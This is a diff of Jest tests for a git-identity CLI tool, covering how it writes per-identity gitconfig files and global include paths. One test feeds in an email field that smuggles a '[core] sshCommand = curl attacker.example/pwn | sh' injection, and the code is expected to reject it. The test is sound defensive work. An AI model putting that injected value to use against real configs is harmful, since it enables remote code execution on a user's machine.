@@ -5,7 +5,7 @@ import path from 'path';
 
 jest.mock('child_process');
 
-import { writeActiveGitconfig, ensureGlobalInclude, activeGitconfigPath } from '../../src/infra/git';
+import { writeActiveGitconfig, writeIdentityGitconfig, ensureGlobalInclude, activeGitconfigPath, identityGitconfigPath } from '../../src/infra/git';
 
 const mockExecFile = execFile as unknown as jest.MockedFunction<typeof execFile>;
 
@@ -126,6 +126,53 @@ describe('infra/git — includeIf-first global identity', () => {
     });
   });
 
+  describe('writeIdentityGitconfig (real temp-dir file assertions — shares renderIdentityGitconfig with writeActiveGitconfig)', () => {
+    it('writes ~/.dss/identities/<slug>.gitconfig with the exact same [user] + [core] shape as active.gitconfig', async () => {
+      await writeIdentityGitconfig({
+        name: 'Work Client',
+        userName: 'Jane Doe',
+        email: 'jane@example.com',
+        host: 'github.com',
+        key: { path: '/keys/work/id_ed25519', algorithm: 'ed25519' }
+      });
+
+      const configPath = identityGitconfigPath('Work Client');
+      expect(configPath).toBe(path.join(tempHome, '.dss', 'identities', 'work-client.gitconfig'));
+
+      const content = await fs.readFile(configPath, 'utf8');
+      expect(content).toBe(
+        '[user]\n' +
+        '\tname = "Jane Doe"\n' +
+        '\temail = "jane@example.com"\n' +
+        '[core]\n' +
+        '\tsshCommand = "ssh -i \'/keys/work/id_ed25519\' -o IdentitiesOnly=yes"\n'
+      );
+    });
+
+    it('writes a [user]-only section for a keyless identity', async () => {
+      await writeIdentityGitconfig({
+        name: 'personal',
+        userName: 'Jane Doe',
+        email: 'jane@personal.example.com',
+        host: 'github.com'
+      });
+
+      const content = await fs.readFile(identityGitconfigPath('personal'), 'utf8');
+      expect(content).not.toContain('[core]');
+    });
+
+    it('throws and writes nothing when email contains a newline (same hard gate as active.gitconfig)', async () => {
+      await expect(writeIdentityGitconfig({
+        name: 'evil',
+        userName: 'Evil User',
+        email: 'evil@example.com\n[core]\n\tsshCommand = curl attacker.example/pwn | sh #',
+        host: 'github.com'
+      })).rejects.toThrow(/line break/);
+
+      await expect(fs.pathExists(identityGitconfigPath('evil'))).resolves.toBe(false);
+    });
+  });
+
   describe('ensureGlobalInclude idempotence (mocked execFile)', () => {
     it('adds the include when unset (git exits 1 for --get-all)', async () => {
       mockExecFile.mockImplementation(((...args: unknown[]) => {
@@ -139,7 +186,7 @@ describe('infra/git — includeIf-first global identity', () => {
         return {} as any;
       }) as any);
 
-      await ensureGlobalInclude();
+      await ensureGlobalInclude(activeGitconfigPath());
 
       const addCalls = mockExecFile.mock.calls.filter((call) => (call[1] as string[]).includes('--add'));
       expect(addCalls).toHaveLength(1);
@@ -158,7 +205,7 @@ describe('infra/git — includeIf-first global identity', () => {
         return {} as any;
       }) as any);
 
-      await ensureGlobalInclude();
+      await ensureGlobalInclude(activeGitconfigPath());
 
       const addCalls = mockExecFile.mock.calls.filter((call) => (call[1] as string[]).includes('--add'));
       expect(addCalls).toHaveLength(0);
@@ -176,7 +223,7 @@ describe('infra/git — includeIf-first global identity', () => {
         return {} as any;
       }) as any);
 
-      await ensureGlobalInclude();
+      await ensureGlobalInclude(activeGitconfigPath());
 
       const addCalls = mockExecFile.mock.calls.filter((call) => (call[1] as string[]).includes('--add'));
       expect(addCalls).toHaveLength(1);
@@ -194,7 +241,51 @@ describe('infra/git — includeIf-first global identity', () => {
         return {} as any;
       }) as any);
 
-      await expect(ensureGlobalInclude()).rejects.toThrow('exit 128');
+      await expect(ensureGlobalInclude(activeGitconfigPath())).rejects.toThrow('exit 128');
+    });
+
+    it('is generalized over the config path — works identically for a second (e.g. rules.gitconfig) path', async () => {
+      const rulesPath = path.join(tempHome, '.dss', 'rules.gitconfig');
+      mockExecFile.mockImplementation(((...args: unknown[]) => {
+        const cmdArgs = args[1] as string[];
+        const callback = args[args.length - 1] as (...cbArgs: unknown[]) => void;
+        if (cmdArgs.includes('--get-all')) {
+          callback(execFileError(1));
+        } else {
+          callback(null, { stdout: '', stderr: '' });
+        }
+        return {} as any;
+      }) as any);
+
+      await ensureGlobalInclude(rulesPath);
+
+      const addCalls = mockExecFile.mock.calls.filter((call) => (call[1] as string[]).includes('--add'));
+      expect(addCalls).toHaveLength(1);
+      expect(addCalls[0][1]).toEqual(['config', '--global', '--add', 'include.path', rulesPath]);
+    });
+
+    it('appends rules.gitconfig AFTER an already-present active.gitconfig include (correct precedence order for free)', async () => {
+      // Simulates the normal call order: dss use/new already added
+      // active.gitconfig's include; dss rule add now adds rules.gitconfig's
+      // — --add always appends, so the resulting include.path list keeps
+      // active.gitconfig first and rules.gitconfig second.
+      const rulesPath = path.join(tempHome, '.dss', 'rules.gitconfig');
+      mockExecFile.mockImplementation(((...args: unknown[]) => {
+        const cmdArgs = args[1] as string[];
+        const callback = args[args.length - 1] as (...cbArgs: unknown[]) => void;
+        if (cmdArgs.includes('--get-all')) {
+          callback(null, { stdout: `${activeGitconfigPath()}\n`, stderr: '' });
+        } else {
+          callback(null, { stdout: '', stderr: '' });
+        }
+        return {} as any;
+      }) as any);
+
+      await ensureGlobalInclude(rulesPath);
+
+      const addCalls = mockExecFile.mock.calls.filter((call) => (call[1] as string[]).includes('--add'));
+      expect(addCalls).toHaveLength(1);
+      expect(addCalls[0][1]).toEqual(['config', '--global', '--add', 'include.path', rulesPath]);
     });
   });
 });
